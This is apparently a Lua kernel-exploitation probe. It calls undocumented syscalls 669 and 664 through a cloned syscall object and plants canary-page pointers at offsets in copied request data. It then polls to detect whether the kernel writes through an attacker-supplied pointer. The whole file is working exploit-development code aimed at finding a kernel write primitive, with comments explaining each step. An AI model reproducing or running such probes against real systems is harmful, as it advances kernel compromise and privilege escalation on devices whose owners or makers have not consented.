-- CRASH_CLASS: HIGH
-- PROBE 492b: does poll write through a pointer taken from the request data?
-- 669 copyins count*0x28 bytes of caller data into the kernel object; 664 then
-- completes the request. If completion uses a pointer field from that copied
-- data (a user buffer address, a result address), a mapped canary page tells us
-- which offset is dereferenced and in which direction. Each trial writes one
-- candidate qword, polls, and checks the canary.
print("=== PROBE 492b: poll dereference map ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local data = memory.alloc(0x2000)
local out  = memory.alloc(0x100)
local ids  = memory.alloc(0x100)
local res  = memory.alloc(0x400)
local canary = memory.alloc(0x1000)
local sc669 = make_syscall(669)
local sc664 = make_syscall(664)
local function wipe()
  for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
  for off = 0, 0x1000 - 1, 4 do pcall(function() memory.write_dword(canary + off, 0xA5A5A5A5) end) end
end
local function canary_dirty()
  for off = 0, 0x1000 - 1, 4 do
    local ok, v = pcall(function() return to_num(memory.read_dword(canary + off)) end)
    if not ok then return off end
    if v ~= 0xA5A5A5A5 then return off end
  end
  return nil
end
local function trial(off, mode)
  wipe()
  for i = 0, 3 do pcall(function() memory.write_qword(data + i * 0x28 + off, uint64(canary)) end) end
  for o = 0, 0x100 - 1, 4 do pcall(function() memory.write_dword(out + o, 0) end) end
  local ok, rv = pcall(function() return sc669(uint64(1), uint64(data), uint64(4), uint64(mode), uint64(out)) end)
  if not ok then return "create-crash" end
  local id = to_num(memory.read_dword(out))
  if id <= 0 then return "create-fail" end
  pcall(function() memory.write_dword(ids, id) end)
  pcall(function() memory.write_dword(res, 0x77777777) end)
  local pok, prv = pcall(function() return sc664(uint64(ids), uint64(4), uint64(res)) end)
  local hit = canary_dirty()
  return string.format("create_ret=%s poll_ret=%s res0=%#x canary=%s", tostring(to_num(rv)),
      pok and tostring(to_num(prv)) or "-", to_num(memory.read_dword(res)),
      hit and string.format("HIT@%#x", hit) or "clean")
end
for _, mode in ipairs({1, 2}) do
  for off = 0, 0x20, 8 do
    print(string.format("mode=%d off=%#04x %s", mode, off, trial(off, mode)))
  end
end
print("=== PROBE 492b COMPLETE ===")
